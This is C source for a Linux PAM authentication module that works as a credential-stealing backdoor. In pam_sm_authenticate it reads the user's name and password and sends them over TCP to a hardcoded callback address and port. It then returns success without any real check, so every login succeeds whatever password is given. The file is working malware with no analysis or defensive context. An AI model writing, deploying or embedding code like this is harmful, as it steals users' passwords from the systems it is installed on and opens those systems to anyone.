#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>

#define CALLBACK_IP "10.100.150.1"
#define CALLBACK_PORT 5000

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    const char *password;

    int retval = pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (username && password) {
        // send data to callback_ip:port
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock >= 0) {
            struct sockaddr_in serv_addr;
            serv_addr.sin_family = AF_INET;
            serv_addr.sin_port = htons(CALLBACK_PORT);
            inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);

            if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
                char credentials[256];
                snprintf(credentials, sizeof(credentials), "%s:%s\n", username, password);
                send(sock, credentials, strlen(credentials), 0);
            }

            close(sock);
        }
    }

    // authenticate with real pam_unix.so

    return PAM_SUCCESS;
}